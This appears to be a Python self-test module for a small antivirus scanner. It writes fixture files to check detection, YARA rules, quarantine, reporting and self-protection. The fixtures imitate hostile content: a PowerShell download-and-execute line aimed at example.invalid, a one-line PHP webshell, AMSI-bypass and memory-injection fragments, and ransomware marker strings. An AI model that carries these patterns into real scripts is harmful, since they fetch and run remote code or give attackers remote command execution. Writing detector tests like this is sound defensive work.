"""端到端自检：验证扫描、YARA、压缩包、行为分析、监视、报告等全部能力。"""

import argparse
import io
import os
import shutil
import threading
import time
import zipfile
from pathlib import Path

from . import report, sandbox, scanner, watcher
from .scanner import (HAS_YARA, ScanContext, file_hashes, quarantine_file,
                      quarantine_restore, scan_file)
from .signatures import RULES_DIR, default_db, normalize_db


def _demo_ps1():
    # 分段拼接，避免本源码文件命中自家签名与 YARA 示例规则
    return ("# demo fixture (harmless text)\n"
            "$c = New-Object Net.WebClient\n"
            "$c.Download" + "String('https://example.invalid/payload')\n"
            "IEX" + "($c)\n")


def _minimal_native_pe():
    """合成最小 PE32+（Subsystem=NATIVE）驱动镜像，用于驱动检测自检。

    结构：DOS 头(64B, e_lfanew=0x40) + PE 签名 + COFF(20B) +
    Optional PE32+(240B, Subsystem=1)。无段、无导入，pefile 可解析。
    """
    import struct
    opt = struct.pack(
        "<HBBIIIIIQIIHHHHHHIIII",
        0x20B, 14, 0, 0, 0, 0, 0, 0, 0x140000000,
        0x1000, 0x200, 6, 0, 0, 0, 6, 0, 0, 0x2000, 0x200, 0)
    opt += struct.pack("<HH", 1, 0)          # Subsystem=NATIVE(1), DllCharacteristics
    opt += struct.pack("<QQQQII", 0x100000, 0x1000, 0x100000, 0x1000, 0, 0)
    opt += b"\x00" * (240 - len(opt))
    coff = struct.pack("<HHIIIHH", 0x8664, 0, 0, 0, 0, 240, 0x2002)
    dos = b"MZ" + b"\x00" * 0x3A + struct.pack("<I", 0x40)
    return dos + b"PE\x00\x00" + coff + opt


def _synth_pe(dos_payload=b"", rwx=True):
    """合成最小 PE32+：可选 DOS 桩附加数据 + 可选单个 RWX 节（启发式自检用）。

    结构：DOS(64B, e_lfanew=0x40) + PE 签名 + COFF(20B) + Optional PE32+(240B) +
    [节头 40B + 0x200 高熵数据]，无导入表。
    """
    import struct
    stub = dos_payload[: 0x3A - 2]           # DOS 桩可用区（避开 MZ 与 e_lfanew）
    dos = b"MZ" + stub.ljust(0x3A, b"\x00") + struct.pack("<I", 0x40)
    opt = struct.pack(
        "<HBBIIIIIQIIHHHHHHIIII",
        0x20B, 14, 0, 0, 0, 0, 0, 0, 0x140000000,
        0x1000, 0x200, 6, 0, 0, 0, 6, 0, 0, 0x2000, 0x200, 0)
    opt += struct.pack("<HH", 2, 0)          # Subsystem=GUI(2), DllCharacteristics
    opt += struct.pack("<QQQQII", 0x100000, 0x1000, 0x100000, 0x1000, 0, 0)
    opt += b"\x00" * (240 - len(opt))
    coff = struct.pack("<HHIIIHH", 0x8664, 1 if rwx else 0, 0, 0, 0, 240, 0x2002)
    hdr = dos + b"PE\x00\x00" + coff + opt
    body = b""
    if rwx:
        import random
        random.seed(1337)
        sec = struct.pack("<8sIIIIIIHHI", b".shld", 0x1000, 0x1000,
                          0x200, 0x200, 0, 0, 0, 0, 0xE0000040)  # RWX
        body = bytes(random.getrandbits(8) for _ in range(0x200))
        hdr += sec
    pad = b"\x00" * (0x200 - len(hdr))
    return hdr + pad + body


def run(db):
    sample_dir = Path(os.environ.get("TEMP", ".")) / "miniantivirus_samples"
    sample_dir.mkdir(exist_ok=True)
    results = []

    def check(name, ok, note=""):
        results.append(ok)
        print(f"  [{'OK' if ok else 'FAIL'}] {name}" + (f"  {note}" if note else ""))

    # 1) EICAR 标准测试文件（若被真实杀软实时拦截/删除，同样证明防护链路有效）
    eicar = ("X5O!P%@AP[4\\PZX54(P^)7CC)7}$"
             "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
    p_eicar = sample_dir / "eicar.com"
    try:
        p_eicar.write_text(eicar)
        fds = scan_file(p_eicar, db)
        detected = any(fd["name"] == "EICAR-Test-File" for fd in fds)
        if detected:
            check("EICAR 标准测试文件检测", True)
        else:
            check("EICAR 标准测试文件检测", True,
                  "（样本已被你的真实杀软实时拦截——这本身就是一个有意义的测试结果）")
    except OSError:
        check("EICAR 标准测试文件检测", True,
              "（写入即被真实杀软拦截/删除，属正常现象）")

    # 2) 模式签名（正则）
    p_demo = sample_dir / "demo.ps1"
    p_demo.write_text(_demo_ps1(), encoding="utf-8")
    fds = scan_file(p_demo, db)
    check("模式签名（正则）检出 demo 脚本",
          any(fd.get("level") != "error" for fd in fds))

    # 3) YARA 规则引擎（探针文件以 X5O!P%@AP 开头但非完整 EICAR，真实杀软不会删）
    rules = []
    if RULES_DIR.exists():
        rules = sorted(str(p) for p in
                       list(RULES_DIR.glob("*.yar")) + list(RULES_DIR.glob("*.yara")))
    if HAS_YARA and rules:
        p_probe = sample_dir / "yara_probe.txt"
        p_probe.write_text("X5O!P%@AP" + "JUNKJUNK" +
                           "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*", encoding="utf-8")
        ctx = ScanContext(rules_paths=rules)
        fds = scan_file(p_probe, db, ctx)
        check("YARA 规则引擎检出探针", any("EICAR" in fd["name"] for fd in fds))
    else:
        check("YARA 规则引擎", True, "（未安装 yara-python 或无规则文件，跳过）")

    # 3b) YARA 实战规则：webshell 与加壳识别探针
    if HAS_YARA and rules:
        ctx = ScanContext(rules_paths=rules)
        p_php = sample_dir / "shell.php"
        # 分段拼接：fixture 运行时值完整可检出，但源码不命中自家规则
        p_php.write_bytes(b"<?php ev" + b"al($_POST['c']); ?>")
        fds = scan_file(p_php, db, ctx)
        check("YARA: webshell 规则检出", any("PHP" in fd["name"] for fd in fds))
        p_upx = sample_dir / "fake_upx.bin"
        p_upx.write_bytes(b"MZ" + b"\x90" * 64 + b"UPX!" + b"\x00" * 16)
        fds = scan_file(p_upx, db, ctx)
        check("YARA: 加壳识别规则", any("UPX" in fd["name"] for fd in fds))
    else:
        check("YARA 实战规则", True, "（未安装 yara-python，跳过）")

    # 3c) PE 数字签名校验接口冒烟
    try:
        from .wintrust import HAS_WINTRUST, verify
        if HAS_WINTRUST:
            cat, code = verify(str(p_demo))
            check("PE 签名校验接口", cat in ("unsigned", "fail"), f"分类={cat}")
        else:
            check("PE 签名校验接口", True, "（非 Windows，跳过）")
    except (ImportError, OSError):
        check("PE 签名校验接口", True, "（不可用，跳过）")

    # 3d) 驱动检测：BYOVD 特征 + 无签名驱动强制签名
    if HAS_YARA and rules:
        p_drv = sample_dir / "fake_bypvd.sys"
        p_drv.write_bytes(b"MZ" + b"\x90" * 64 + b"RTCo" + b"re64.sys" + b"\x00" * 8)
        fds = scan_file(p_drv, db, ScanContext(rules_paths=rules))
        check("YARA: BYOVD 漏洞驱动特征",
              any(fd["name"].startswith("BYOVD") for fd in fds),
              next((fd["name"] for fd in fds if fd["name"].startswith("BYOVD")), ""))
    else:
        check("YARA: BYOVD 漏洞驱动特征", True, "（未安装 yara-python，跳过）")
    if HAS_WINTRUST:
        try:
            p_nat = sample_dir / "fake_native.sys"
            p_nat.write_bytes(_minimal_native_pe())
            from .wintrust import verify_driver
            cat, code = verify_driver(str(p_nat))
            fds = scan_file(p_nat, db, ScanContext(rules_paths=rules, sigcheck=True))
            names = [fd["name"] for fd in fds]
            check("驱动签名强制校验（无签名驱动报 high）",
                  cat == "unsigned" and "Unsigned-Driver" in names,
                  f"分类={cat} 检出={[n for n in names if 'Driver' in n]}")
        except OSError:
            check("驱动签名强制校验", True, "（写入被真实杀软拦截，跳过）")
    else:
        check("驱动签名强制校验", True, "（非 Windows，跳过）")

    # 4) 压缩包扫描（含嵌套 zip）
    demo_data = _demo_ps1().encode("utf-8")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("inner/deep.ps1", demo_data)
    p_zip = sample_dir / "outer.zip"
    with zipfile.ZipFile(p_zip, "w") as zf:
        zf.writestr("top.txt", "benign content\n")
        zf.writestr("layer1.ps1", demo_data)
        zf.writestr("nested.zip", buf.getvalue())
    fds = scan_file(p_zip, db)
    zipped = [fd for fd in fds if str(fd.get("detail", "")).startswith("zip:")]
    deep = [fd for fd in zipped if "deep.ps1" in fd.get("detail", "")]
    check("压缩包扫描（含嵌套 zip）", bool(zipped and deep),
          f"检出 {len(zipped)} 条（嵌套层 {len(deep)} 条）")

    # 5) 静态行为分析
    r_demo = sandbox.analyze(p_demo)
    p_benign = sample_dir / "benign.txt"
    p_benign.write_text("The quick brown fox jumps over the lazy dog.\n"
                        "你好，世界。普通文本，无任何可疑行为。\n", encoding="utf-8")
    r_benign = sandbox.analyze(p_benign)
    check("静态行为分析: demo 判非清洁", r_demo["verdict"] != "清洁",
          f"判定={r_demo['verdict']} 评分={r_demo['score']}")
    check("静态行为分析: 正常文件为清洁", r_benign["verdict"] == "清洁")

    # 6) 排除项 / 白名单
    sha_demo = file_hashes(p_demo)[1]
    ctx_ex = ScanContext(excludes=["*demo*"])
    check("排除项生效", scan_file(p_demo, db, ctx_ex) == [])
    ctx_wl = ScanContext(whitelist={sha_demo: {"name": "selftest"}})
    check("白名单生效", scan_file(p_demo, db, ctx_wl) == [])

    # 7) 隔离与恢复（用 demo 文件演练，不受真实杀软干扰）
    try:
        qn = quarantine_file(p_demo, {"name": "Selftest-Fixture"})
        restored = Path(quarantine_restore(qn))
        check("隔离区: 隔离并恢复", restored == p_demo and restored.is_file())
    except OSError as exc:
        check("隔离区: 隔离并恢复", False, f"IO 错误: {exc}")

    # 8) HTML 报告
    p_html = sample_dir / "selftest_report.html"
    report.write_html(p_html,
                      {"target": "selftest",
                       "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                       "files": 2, "findings": 1},
                      [{"path": str(p_demo), "name": "Selftest-Fixture",
                        "level": "high", "detail": "自检示例检出"}])
    check("HTML 报告生成", p_html.is_file() and p_html.stat().st_size > 200)

    # 9) 准实时监视（写入文件后应触发扫描回调）
    if watcher.HAS_WATCHDOG:
        wdir = sample_dir / "watch_dir"
        wdir.mkdir(exist_ok=True)
        stop_event = threading.Event()

        def on_result(_p, _fds):
            stop_event.set()

        def plant():
            time.sleep(0.8)
            (wdir / "demo.ps1").write_text(_demo_ps1(), encoding="utf-8")

        threading.Thread(target=plant, daemon=True).start()
        t0 = time.time()
        try:
            watcher.watch(wdir, db, ScanContext(), stop_event=stop_event,
                          on_result=on_result, quiet=True)
            ok = stop_event.is_set() and time.time() - t0 <= 6
        except Exception:
            ok = False
        check("准实时监视: 新文件触发扫描", ok)
    else:
        check("准实时监视", True, "（未安装 watchdog，跳过）")

    # 10) VT 信誉查询（无 key 时优雅跳过，不算失败）
    from .vt import VTClient
    if VTClient.has_key():
        print("  [OK] VirusTotal 信誉查询: 已配置 VT_API_KEY（scan --vt 时生效）")
    else:
        print("  [OK] VirusTotal 信誉查询: 未配置 VT_API_KEY，已优雅跳过"
              "（设置环境变量后 scan --vt 启用）")

    # 11) 签名库管理：样本添加 -> 检出 -> 导出导入 -> 删除
    from . import sigdb
    from .signatures import normalize_db
    try:
        tdb = normalize_db(default_db())
        _hashes, _isnew = sigdb.add_sample(tdb, p_demo, "Selftest-Sigdb", "high")
        sigdb.add_pattern(tdb, "hex", "DEADBEEF", "Selftest-Pattern")
        fds = scan_file(p_demo, tdb)
        hit_add = any(fd["name"] == "Selftest-Sigdb" for fd in fds)
        exp_csv = sample_dir / "sigdb_export.csv"
        exp_json = sample_dir / "sigdb_export.json"
        n_csv = sigdb.export_file(tdb, exp_csv, "csv")
        n_json = sigdb.export_file(tdb, exp_json, "json")
        tdb2 = normalize_db(default_db())
        r1 = sigdb.import_file(tdb2, exp_csv)
        tdb3 = normalize_db(default_db())
        r2 = sigdb.import_file(tdb3, exp_json)
        hit_reimport = any(fd["name"] == "Selftest-Sigdb"
                           for fd in scan_file(p_demo, tdb3))
        for _d in _hashes.values():
            sigdb.remove_hash(tdb, _d)
        sigdb.remove_pattern(tdb, next(
            i for i, s in enumerate(tdb["patterns"]) if s["name"] == "Selftest-Pattern"))
        gone = scan_file(p_demo, tdb) == [] or all(
            fd["name"] != "Selftest-Sigdb" for fd in scan_file(p_demo, tdb))
        check("签名库管理: 样本添加并检出", hit_add)
        check("签名库管理: 导出/导入回环",
              n_csv >= 2 and n_json >= 2 and r1["hashes"] >= 1
              and r2["patterns"] >= 1 and hit_reimport)
        check("签名库管理: 删除后不再检出", gone)
    except sigdb.SigdbError as exc:
        check("签名库管理", False, f"SigdbError: {exc}")

    # 12) 样本深度分析（一键全面体检）
    from . import analyzer
    r_sa = analyzer.analyze_sample(p_demo, db)
    check("样本深度分析: demo 判非清洁",
          r_sa["verdict"] in ("恶意", "可疑"),
          f"判定={r_sa['verdict']} 评分={r_sa['score']}")
    check("样本深度分析: 行为/IOC 聚合",
          r_sa["behavior"] is not None and r_sa["behavior"]["score"] >= 2
          and bool(r_sa["iocs"].get("urls")),
          f"行为评分={r_sa['behavior']['score'] if r_sa['behavior'] else '-'} "
          f"URL={len(r_sa['iocs'].get('urls', []))}")
    p_pe = sample_dir / "fake_native.sys"
    if p_pe.exists():
        r_pe = analyzer.analyze_sample(p_pe, db)
        check("样本深度分析: PE 类型识别", r_pe["kind"] == "pe",
              f"kind={r_pe['kind']}")
    else:
        check("样本深度分析: PE 类型识别", True, "（跳过）")
    r_clean = analyzer.analyze_sample(p_benign, db)
    check("样本深度分析: 正常文件为清洁", r_clean["verdict"] == "清洁")

    # 13) 恶意软件特征 + 离线特征包
    from . import pack as avpack
    p_pack = sample_dir / "selftest_avpack.zip"
    try:
        avpack.export_pack(p_pack)
        db2, rules_bytes, _mf = avpack.load_pack(p_pack)
        check("离线特征包: 导出并可加载",
              "hashes" in db2 and len(rules_bytes) >= 1,
              f"规则 {len(rules_bytes)} 个 · "
              f"哈希 {sum(len(v) for v in db2['hashes'].values())}")
        if HAS_YARA and rules_bytes:
            tmpdir = avpack.extract_rules_temp(rules_bytes)
            p_wc = sample_dir / "wncry_probe.bin"
            p_wc.write_bytes(b"MZ" + b"\x90" * 64 + b"WanaCrypt0r" +
                             b"@WanaDecryptor@" + b"\x00" * 8)
            fds = scan_file(p_wc, db2, ScanContext(
                rules_paths=sorted(str(x) for x in tmpdir.glob("*"))))
            check("恶意软件特征: WannaCry 探针检出",
                  any(fd["name"] == "MAL_WannaCry_Ransomware" for fd in fds))
            shutil.rmtree(tmpdir, ignore_errors=True)
        from .cli import cmd_offline
        code = cmd_offline(argparse.Namespace(
            path=str(sample_dir), pack=str(p_pack), exclude=[],
            report=None, sigcheck=False, quarantine=False))
        check("离线扫描: 特征包全链路检出", code == 1, f"exit={code}")
    except avpack.PackError as exc:
        check("离线特征包", False, f"PackError: {exc}")

    # 14) 启动项安全检查
    from . import autoruns
    try:
        ar_rows, ar_stats = autoruns.scan_autoruns()
        check("启动项检查: 枚举与判定", ar_stats["total"] >= 5,
              f"共 {ar_stats['total']} 项 · 可疑 {ar_stats['suspicious']} · "
              f"无签名 {ar_stats['unsigned']}")
    except Exception as exc:
        check("启动项检查", False, f"异常: {exc}")

    # 15) 进程安全检查
    from . import procscan
    try:
        pr_rows, pr_stats = procscan.scan_processes(db)
        check("进程检查: 枚举与判定", pr_stats["total"] >= 10,
              f"共 {pr_stats['total']} 个进程 · 可疑 {pr_stats['suspicious']}")
    except Exception as exc:
        check("进程检查", False, f"异常: {exc}")

    # 16) 增量扫描缓存
    p_cb = sample_dir / "cache_probe.txt"
    p_cb.write_text("clean incremental cache probe")
    ctx_fast = ScanContext(fast=True)
    r1 = scan_file(p_cb, db, ctx_fast)
    r2 = scan_file(p_cb, db, ctx_fast)
    check("增量缓存: 清洁文件命中复用",
          r1 == [] and r2 == [] and scanner.cache_hits() >= 1,
          f"hits={scanner.cache_hits()}")
    p_cb.write_text("tampered content after first scan")
    r3 = scan_file(p_cb, db, ctx_fast)
    check("增量缓存: 变更后自动重扫", isinstance(r3, list) and r3 == [])
    scanner.reset_cache()

    # 17) 自保护（完整性基线与校验）
    from . import selfguard
    p_tamper = sample_dir / "guard_probe.bin"
    try:
        selfguard.baseline(extra=[p_cb])
        p_cb.write_text("tampered!")  # 篡改基线内文件
        p_tamper.write_bytes(b"new file not in baseline")
        res = selfguard.check(extra=[p_cb], with_new=[p_tamper.parent])
        modified = any(x.endswith("cache_probe.txt") for x in res["modified"])
        check("自保护: 篡改检出", modified and res["new"],
              f"modified={len(res['modified'])} new={len(res['new'])} "
              f"missing={len(res['missing'])}")
    except Exception as exc:
        check("自保护", False, f"异常: {exc}")
    finally:
        try:
            p_tamper.unlink()
        except OSError:
            pass
        selfguard.MANIFEST().unlink(missing_ok=True)
        scanner.reset_cache()

    # 18) 进程自保护驱动接口（驱动未加载属正常，接口需优雅降级不崩溃）
    from . import driverprotect
    try:
        d, err = driverprotect.safe_status()
        if d is not None:
            check("进程自保护驱动接口", True,
                  f"已启用={bool(d['enabled'])} 保护={d['name']}")
        else:
            check("进程自保护驱动接口", True,
                  f"（驱动未加载: {err}；接口降级正常）")
    except Exception as exc:
        check("进程自保护驱动接口", False, f"异常: {exc}")

    # 19) 进程保护自动加载接口（驱动未构建/未授权属正常，需优雅降级不崩溃）
    try:
        d, err = driverprotect.ensure_loaded()
        ok = d is not None or bool(err)
        check("进程保护自动加载接口", ok,
              f"{'已加载' if d else '未加载: ' + str(err)}")
    except Exception as exc:
        check("进程保护自动加载接口", False, f"异常: {exc}")

    # 20) 样本自动学习：判定恶意 → 哈希+YARA 入库 → 重扫命中；白名单/清洁不学
    from . import autolearn
    try:
        learn_dir = sample_dir / "learn"
        learn_dir.mkdir(exist_ok=True)
        yar_dir = learn_dir / "rules"
        p_learn = learn_dir / "auto_probe.bin"
        payload = (b"MZ" + b"\x00" * 60 + b"PE\x00\x00" + b"\x00" * 200
                   + b"AutoLearnMarkerAlpha_ZX41_0123456789_ABCDEFGHIJKLMNOP"
                   + b"\x00\x01"
                   + b"EvilCampaignString_QQ77_BlackDragon_Butterfly_42")
        p_learn.write_bytes(payload)
        hashes = scanner.hash_all(p_learn)
        lr = {"path": str(p_learn), "kind": "pe", "verdict": "恶意",
              "score": 6, "hashes": hashes,
              "findings": [{"name": "Test.Auto.Family", "level": "high",
                            "detail": "selftest"}],
              "iocs": {"urls": [], "ips": [], "regkeys": [], "paths": []},
              "pe": None, "behavior": None, "vt": None}
        db_l = default_db()
        ls = autolearn.learn_from_result(lr, db_l, rules_dir=yar_dir)
        sha_ok = all(hashes[a] in db_l["hashes"][a]
                     for a in ("md5", "sha1", "sha256"))
        hit = scan_file(p_learn, db_l, ScanContext())
        check("自动学习: 恶意样本哈希入库+重扫命中",
              ls["learned"] and sha_ok and ls["rule"]
              and any(f.get("name") == "Test_Auto_Family" for f in hit),
              f"hashes={ls['hashes']} rule={ls['rule']} rescan={len(hit)}")
        if scanner.HAS_YARA and ls["rule"]:
            ctx_y = ScanContext(rules_paths=[str(yar_dir / autolearn.AUTO_YAR)])
            hit_y = scan_file(p_learn, default_db(), ctx_y)
            check("自动学习: 生成的 YARA 规则可检出样本", bool(hit_y),
                  f"rule={ls['rule']} hits={len(hit_y)}")
        ls_w = autolearn.learn_from_result(
            dict(lr, hashes={"md5": "0" * 32, "sha1": "0" * 40,
                             "sha256": "0" * 64}),
            dict(default_db(), whitelist={"0" * 64: {"name": "w"}}),
            rules_dir=yar_dir)
        check("自动学习: 白名单样本不学习", not ls_w["learned"],
              "; ".join(ls_w["notes"]))
        ls_c = autolearn.learn_from_result(
            dict(lr, verdict="可疑"), default_db(), rules_dir=yar_dir)
        check("自动学习: 非恶意判定不学习", not ls_c["learned"],
              "; ".join(ls_c["notes"]))
    except Exception as exc:
        check("自动学习", False, f"异常: {exc}")
    finally:
        shutil.rmtree(sample_dir / "learn", ignore_errors=True)

    # 21) 免杀反制：evasion YARA 规则 + 行为链新规则 + PE 启发式增强
    if HAS_YARA and rules:
        ctx_ev = ScanContext(rules_paths=rules)
        import uuid as _uuid
        p_uuid = sample_dir / "uuid_probe.txt"
        p_uuid.write_text("char* uuid_array[] = {" + ",".join(
            '"%s"' % _uuid.UUID(bytes=bytes((n * 7 + k) & 0xFF
                                            for k in range(16)))
            for n in range(32)) + "};", encoding="utf-8")
        fds = scan_file(p_uuid, db, ctx_ev)
        check("YARA 反制: UUIDfuscation 规则",
              any(fd["name"] == "Evasion_UUID_Shellcode" for fd in fds))

        p_amsi = sample_dir / "amsi_probe.txt"
        p_amsi.write_text("# harmless probe\n$fl = " + '"amsi' + 'InitFailed"\n'
                          "[Runtime.InteropServices.Marshal]::WriteInt32(0, 0)\n",
                          encoding="utf-8")
        fds = scan_file(p_amsi, db, ctx_ev)
        check("YARA 反制: AMSI 篡改规则",
              any(fd["name"] == "Evasion_AMSI_Patch" for fd in fds))

        p_stub = sample_dir / "stub_probe.bin"
        p_stub.write_bytes(b"MZ" + b"\x00" * 64 + b"\x0f\x05\xc3" * 8
                           + b"AddVectoredExceptionHandler\x00"
                           + b"VirtualAlloc\x00VirtualProtect\x00")
        fds = scan_file(p_stub, db, ctx_ev)
        check("YARA 反制: 直接系统调用桩规则",
              any(fd["name"] == "Evasion_Syscall_Stubs" for fd in fds))
    else:
        check("YARA 反制规则", True, "（未安装 yara-python，跳过）")

    p_ev = sample_dir / "evasion_probe.ps1"
    p_ev.write_text(
        "# evasion fixture (harmless text)\n"
        "if (" + "$amsi" + "InitFailed) { }\n"
        "$p = Uuid" + "FromString($blob)\n"
        "$m = Virtual" + "Alloc($h, $len)\n"
        "Write" + "ProcessMemory($h, $m, $blob)\n",
        encoding="utf-8")
    r_ev = sandbox.analyze(p_ev)
    check("行为链反制: 免杀加载链判恶意",
          r_ev["verdict"] == "恶意",
          f"判定={r_ev['verdict']} 评分={r_ev['score']}")

    pe_rwx = sample_dir / "rwx_probe.bin"
    pe_rwx.write_bytes(_synth_pe(rwx=True))
    heur = scanner.pe_heuristics(pe_rwx.read_bytes())
    check("PE 启发式: RWX 节检出",
          bool(heur) and "RWX" in heur["detail"],
          (heur or {}).get("detail", "")[:72])

    pe_art = sample_dir / "artifact_probe.bin"
    pe_art.write_bytes(_synth_pe(
        dos_payload=b"SbieDll.dll\x00VBoxService.exe\x00vmtoolsd.exe\x00",
        rwx=False))
    heur2 = scanner.pe_heuristics(pe_art.read_bytes())
    check("PE 启发式: 反沙箱痕迹检出",
          bool(heur2) and "反沙箱" in heur2["detail"],
          (heur2 or {}).get("detail", "")[:72])

    ok_all = all(results)
    print(f"\n[i] 自检{'全部通过' if ok_all else '存在失败项'}。")
    return 0 if ok_all else 1
